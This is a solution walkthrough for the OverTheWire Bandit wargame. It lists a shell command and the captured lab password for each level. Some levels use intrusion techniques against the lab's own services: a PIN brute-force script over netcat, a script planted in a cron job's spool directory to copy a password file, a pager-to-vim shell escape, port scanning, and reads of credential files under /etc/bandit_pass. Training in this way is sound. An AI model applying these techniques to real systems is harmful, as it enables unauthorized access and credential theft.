# Solution

## 0
```sh
ssh -p 2220 bandit0@bandit.labs.overthewire.org
```
password: boJ9jbbUNNfktd78OOpsqOltutMc3MY1

## 1
```sh
cat ./-
```
password: CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9

## 2
```sh
cat spaces\ in\ this\ filename
```
password: UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK

## 3
```sh
cat inhere/.hidden
```
password: pIwrPrtPN36QITSp3EQaw936yaFoFgAB

## 4
```sh
bandit4@bandit:~/inhere$ file ./*
./-file00: data
./-file01: data
./-file02: data
./-file03: data
./-file04: data
./-file05: data
./-file06: data
./-file07: ASCII text
./-file08: data
./-file09: data

cat ./-file07
```
password: koReBOKuIDDepwhWk7jZC0RTdopnAYKh

## 5
```sh
find * -size 1033c -readable -exec cat {} \;
```
password: DXjZPULLxYr17uwoI01bNLQbtFemEgo7

## 6
```sh
find / -size 33c -user bandit7 -group bandit6 -exec cat {} \; 2>/dev/null
```
password: HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs

## 7
```sh
cat data.txt | grep millionth
```
password: cvX2JJa4CFALtqS87jk27qwqGhBM9plV

## 8
```sh
cat data.txt | sort | uniq -u
```
password: UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR

## 9
```sh
strings data.txt | egrep "[=]{2,}"
```
password: truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk

## 10
```sh
base64 -d data.txt
```
password: IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR

## 11
```sh
cat data.txt | tr '[a-z]' '[n-za-m]' | tr '[A-Z]' '[N-ZA-M]'
```

password: 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu

## 12
```sh
xxd -r data.txt | gzip -d | bzip2 -d | gzip -d | tar -x
tar -xf data5.bin
tar -xf data6.bin
cat data8.bin | gzip -d
```
password: 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL

## 13
```sh
ssh -i sshkey.private bandit14@localhost
```
password: 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e

## 14
```sh
telnet localhost 30000
```
password: BfMYroe26WYalil77FoDi9qh59eK5xNr

## 15
```sh
openssl s_client -connect localhost:30001
```
password: cluFn7wTiGryunymYOu4RcffSxQluehd

## 16
```sh
-zv localhost 31000-32000
	localhost [127.0.0.1] 31790 (?) open
	localhost [127.0.0.1] 31518 (?) open
openssl s_client -connect localhost:31790
```
ssh key

## 17
```sh
diff passwords.new passwords.old
```
password: kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd

## 18
```sh
ssh -p 2220 -t bandit18@bandit.labs.overthewire.org /bin/sh<Paste>
```
password: IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x

## 19
```sh
./bandit20-do cat /etc/bandit_pass/*
```
password: GbKksEFF4yrVs6il55v6gwY5aVje5f0j

## 20
```sh
sleep 10 && ./suconnect 12345 &
nc -l -p 12345
```
password: gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr

## 21
```sh
cat /etc/cron.d/cronjob_bandit22
	#!/bin/bash
	chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
	cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
```
password: Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI

## 22
```sh
cat /etc/cron.d/cronjob_bandit23
	@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
	* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null

cat /usr/bin/cronjob_bandit23.sh
	#!/bin/bash

	myname=$(whoami)
	mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

	echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

	cat /etc/bandit_pass/$myname > /tmp/$mytarget

target=$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)
cat /tmp/$target
```
password: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n


## 23
```sh
cat /etc/cron.d/cronjob_bandit24
	@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
	* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null

cat /usr/bin/cronjob_bandit24.sh
	#!/bin/bash

	myname=$(whoami)

	cd /var/spool/$myname
	echo "Executing and deleting all scripts in /var/spool/$myname:"
	for i in * .*;
	do
	    if [ "$i" != "." -a "$i" != ".." ];
	    then
		echo "Handling $i"
		timeout -s 9 60 ./$i
		rm -f ./$i
	    fi
	done
```
script.sh
```sh
#!/bin/bash

cp /etc/bandit_pass/bandit24 /tmp/alexon2/
chmod 777 /tmp/alexon2/bandit24
```
password: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ


## 24
```sh
#!/bin/bash

task () {
    result=$(echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $1" | nc -w 1 localhost 30002)
    if [[ $result != *"Wrong"* ]]; then
	    echo Found!
	    echo $result > pass.txt
	    echo $i >> pass.txt
    fi
}

for i in $(seq -f "%04g" 8652 -1 0)
do
	echo $i
	task $i &
	sleep 0.5
done
```
picode: 2648
password: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

## 25
```sh
cat /etc/passwd | grep bandit26
	bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext

cat /etc/bin/showtext
	#!/bin/sh

	export TERM=linux

	more ~/text.txt
	exit 0
```
`more` command enable paging only when terminal height is less that text length. To enable paging make change terminal size to 1 row.
`v` command run vim for editting current file.
`:set shell=/bin/bash`
`:! bash`

password: 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z

## 26
```sh
./bandit27-do cat /etc/bandit_pass/bandit27
```
password: 3ba3118a22e93127a4ed485be72ef5ea


## 27
```sh
git clone ssh://bandit27-git@localhost/home/bandit27-git/repo
cat repo/README
```
password: 0ef186ac70e04ea33b4c1853d2526fa2

## 28
```sh
git clone ssh://bandit28-git@localhost/home/bandit28-git/repo
cd repo
git checkout 186a1038cc54d1358d42d468cdc8e3cc28a93fcb
cat README.md
```

password: bbc96594b4e001778eee9975372716b2

## 29
```
git checkout dev
cat README.md
```

password: 5b90576bedb2cc04c86a9e924ce42faf 

## 30
```sh
git show secret
```

password: 47e603bb428404d265f59c42920d81e5


## 31
```sh
echo 'May I come in?' > key.txt
git add -f key.txt
git commit -m "test"
git push
```
password: 56a9bf19c63d650ce78e6ec0354ee45e

## 32
```sh
$0
```
password: c9c3199ddf4121b10cf581a98d51caee

